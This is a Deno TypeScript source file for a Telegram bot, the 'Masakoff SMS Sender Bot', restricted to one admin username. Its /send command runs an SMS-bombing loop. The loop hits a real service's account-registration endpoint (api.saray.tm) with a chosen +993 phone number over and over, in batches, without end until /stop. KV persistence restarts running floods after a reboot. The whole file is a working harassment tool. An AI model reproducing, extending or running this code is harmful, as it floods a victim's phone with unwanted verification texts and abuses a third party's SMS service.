// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// ♾️ Runs forever, handles /stop anytime, with KV persistence

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- 🔐 Telegram settings ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- 👑 Admin username ---
const ADMIN_USERNAME = "Masakoff";

// --- 💾 Deno KV for persistence ---
const kv = await Deno.openKv();

// --- 💬 Helper: send Telegram message ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, ...options }),
    });
  } catch (e) {
    console.error("sendMessage error ❌", e);
  }
}

// --- 🌐 POST request helper ---
async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
  try {
    const resp = await fetch(url, { method: "POST", headers, body: JSON.stringify(data) });
    return resp.status === 200;
  } catch (e) {
    console.error("POST failed ❌", e);
    return false;
  }
}

// --- 🧠 Track all active tasks in memory ---
const activeTasks = new Map<string, { stop: boolean }>();

// --- ⏱ Interruptible sleep ---
async function sleepInterruptible(totalMs: number, task: { stop: boolean }, chunkMs = 500) {
  const start = Date.now();
  while (Date.now() - start < totalMs) {
    if (task.stop) return false;
    await delay(Math.min(chunkMs, totalMs - (Date.now() - start)));
  }
  return true;
}

// --- 💣 SMS sending loop ---
async function sendSMS(phoneNumber: string, chatId: string) {
  const task = { stop: false };
  activeTasks.set(chatId, task);
  await kv.set(["active", chatId], { phoneNumber, running: true });

  const requestsData = [
    {
      url: "https://api.saray.tm/api/v1/accounts",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.saray.tm",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0",
      },
      data: { phone: `+993${phoneNumber}` },
    },
  ];

  let count = 0;
  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);

  outer: while (!task.stop) {
    for (let batch = 0; batch < 3; batch++) {
      if (task.stop) break outer;
      count++;

      for (const req of requestsData) {
        if (task.stop) break outer;
        await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);

        const success = await sendPostRequest(req.url, req.headers, req.data);
        await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send!");

        // --- 5s interruptible sleep between messages ---
        const ok = await sleepInterruptible(5000, task);
        if (!ok) break outer;
      }
    }

    if (task.stop) break;

    await sendMessage(chatId, "⏳ 3 SMS sent. Waiting 45 seconds before next batch...");
    const ok = await sleepInterruptible(45000, task);
    if (!ok) break;
  }

  activeTasks.delete(chatId);
  await kv.delete(["active", chatId]);
  await sendMessage(chatId, "⏹ SMS sending stopped. Thank you! 🎉");
}

// --- ♻️ Background recovery ---
async function restoreRunningTasks() {
  console.log("🔄 Checking for previously running tasks...");
  for await (const entry of kv.list<{ phoneNumber: string; running: boolean }>({ prefix: ["active"] })) {
    if (entry.value.running) {
      console.log(`♻️ Restoring SMS task for chat ${entry.key[1]} (${entry.value.phoneNumber})`);
      sendSMS(entry.value.phoneNumber, entry.key[1] as string).catch(console.error);
    }
  }
}
restoreRunningTasks();

// --- 🖥️ Telegram webhook server ---
serve(async (req) => {
  if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
    return new Response("Invalid request ❌", { status: 400 });
  }

  const update = await req.json().catch(() => null);
  if (!update?.message || update.message.chat.type !== "private") return new Response("OK");

  const chatId = String(update.message.chat.id);
  const text = (update.message.text ?? "").trim();
  const username = update.message.from?.username ?? "";

  // --- 🔐 Admin check ---
  if (username !== ADMIN_USERNAME) {
    await sendMessage(chatId, "🚫 Access denied! This bot is for @Masakoff only 👑");
    return new Response("OK");
  }

  // --- ⚙️ Commands ---
  if (text.startsWith("/start")) {
    await sendMessage(
      chatId,
      "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
        "📲 Commands:\n" +
        "• /send <number> — start sending SMS\n" +
        "• /stop — stop all sending instantly ⛔\n\n" +
        "✨ Created by @Masakoff",
    );
  } else if (text.startsWith("/send")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide a phone number.\nExample: /send 61234567");
    } else if (activeTasks.has(chatId)) {
      await sendMessage(chatId, "⚠️ A task is already running! Stop it with /stop first.");
    } else {
      const phoneNumber = parts[1].replace(/^\+993/, "");
      sendSMS(phoneNumber, chatId).catch(console.error);
    }
  } else if (text.startsWith("/stop")) {
    if (activeTasks.size > 0) {
      for (const task of activeTasks.values()) task.stop = true;
      await kv.delete(["active", chatId]);
      await sendMessage(chatId, "🛑 Stop signal sent! Tasks will halt instantly...");
    } else {
      await sendMessage(chatId, "ℹ️ No active tasks to stop.");
    }
  } else {
    await sendMessage(chatId, "❓ Unknown command. Try /start, /send <number>, or /stop.");
  }

  return new Response("OK");
});







